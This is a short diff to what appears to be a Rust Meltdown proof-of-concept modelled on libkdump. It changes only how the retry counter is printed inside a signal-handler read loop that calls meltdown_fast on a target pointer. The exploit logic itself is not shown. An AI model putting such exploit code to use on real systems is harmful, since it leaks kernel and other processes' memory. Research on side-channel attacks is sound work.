@@ -155,7 +155,8 @@ pub fn handle_signal() {
 pub fn libkdump_read_signal_handler(config: &Config, cache_miss_threshold: u64, mem: &[MemoryPage], pointer: *const u8) -> usize {
 	//println!("Called libkdump_read_signal_handler for pointer {:?}", pointer);
 	for iteration in 0..config.retries {
-		print!(" {}\x1b[1D\x1b[1D", iteration % 10);
+		let iteration_num_digits = iteration.checked_ilog10().unwrap_or(0) + 1;
+		print!(" {}{}", iteration, "\x1b[1D".repeat(iteration_num_digits as usize));
 		unsafe {
 			if setjmp(&mut *jump_buf.lock()) == 0 {
 				meltdown_fast(mem, pointer);
